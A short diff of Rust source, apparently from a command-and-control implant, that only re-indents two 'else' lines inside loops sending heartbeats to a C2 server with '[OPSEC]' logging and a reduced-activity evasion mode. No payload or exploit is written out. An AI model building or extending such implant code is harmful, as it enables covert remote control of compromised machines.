@@ -110,7 +110,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
 
                 if let Err(e) = crate::commands::command_shell::send_heartbeat_with_client(&config, &server_addr, &agent_id).await {
                     error!("[OPSEC] Heartbeat failed in ReducedActivity (initial loop): {}. C2 failure counter updated internally.", e);
-                } else {
+        } else {
                     info!("[OPSEC] Heartbeat successful in ReducedActivity (initial loop).");
                 }
                 
@@ -159,7 +159,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
 
                     if let Err(e) = crate::commands::command_shell::send_heartbeat_with_client(&config, &server_addr, &agent_id).await {
                         error!("[OPSEC] Heartbeat failed in ReducedActivity (re-assessment loop): {}. C2 failure counter updated internally.", e);
-                    } else {
+            } else {
                         info!("[OPSEC] Heartbeat successful in ReducedActivity (re-assessment loop).");
                     }
 
